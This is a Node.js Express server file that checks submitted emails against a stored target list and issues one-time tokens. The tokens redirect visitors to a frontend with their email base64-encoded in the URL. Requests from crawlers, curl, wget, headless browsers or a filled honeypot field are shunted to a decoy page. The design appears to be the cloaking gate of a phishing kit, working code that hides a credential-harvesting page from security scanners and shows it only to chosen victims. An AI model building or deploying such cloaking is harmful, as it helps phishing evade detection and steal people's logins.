// 📁 backend/index.js
require('dotenv').config()
const express = require('express')
const cors = require('cors')
const fs = require('fs')
const path = require('path')
const fetch = require('node-fetch')
const crypto = require('crypto')
const helmet = require('helmet')
const rateLimit = require('express-rate-limit')

const app = express()
const PORT = process.env.PORT || 3000
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt')
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app'
const DEBUG = process.env.DEBUG === 'true'

let validEmails = new Set()
let tokenMap = new Map()

function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8')
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()))
    console.log('[INFO] Email list loaded')
  } catch (err) {
    console.error('[ERROR] Failed to load emails:', err)
  }
}
loadEmails()

setInterval(() => {
  const now = Date.now()
  for (const [token, info] of tokenMap.entries()) {
    if (info.expires < now) {
      tokenMap.delete(token)
      DEBUG && console.log(`[INFO] Expired token ${token} cleared`)
    }
  }
}, 5 * 60 * 1000)

// Middleware
app.use(helmet())
app.use(express.json())
app.use(cors())
app.use(express.static(path.join(__dirname, '../frontend/dist')))

app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`)
  }
  next()
})

app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 50,
  message: { valid: false, message: 'Too many requests. Try again later.' }
}))

// Bot detection function
function isBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase()
  return !ua || /bot|crawl|spider|headless|python|scrapy|wget|curl/.test(ua)
}

// API email verification
app.post('/api/check-email', async (req, res) => {
  const { email, middleName } = req.body

  if (middleName && middleName.trim() !== '') {
    return res.redirect('/lalaland.html')
  }

  if (isBot(req)) {
    return res.redirect('/lalaland.html')
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Invalid email' })
  }

  const normalized = email.toLowerCase()
  if (!validEmails.has(normalized)) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' })
  }

  const token = crypto.randomBytes(16).toString('hex')
  const encoded = Buffer.from(normalized).toString('base64')

  const existing = Array.from(tokenMap.entries()).find(([_, v]) => v.email === encoded)
  if (existing) {
    tokenMap.delete(existing[0])
    DEBUG && console.log(`[INFO] Replacing previous token for ${normalized}`)
  }

  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 })
  const redirectUrl = `/forward?token=${token}`

  return res.json({ valid: true, redirectUrl })
})

app.get('/forward', (req, res) => {
  const { token } = req.query
  const entry = tokenMap.get(token)

  if (!entry || Date.now() > entry.expires) {
    tokenMap.delete(token)
    return res.status(403).send('Invalid or expired token.')
  }

  tokenMap.delete(token)
  res.redirect(`/#${entry.email}`)
})

app.get('/lalaland.html', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/public/lalaland.html'))
})

app.listen(PORT, () => {
  console.log(`[READY] Backend running on port ${PORT}`)
})
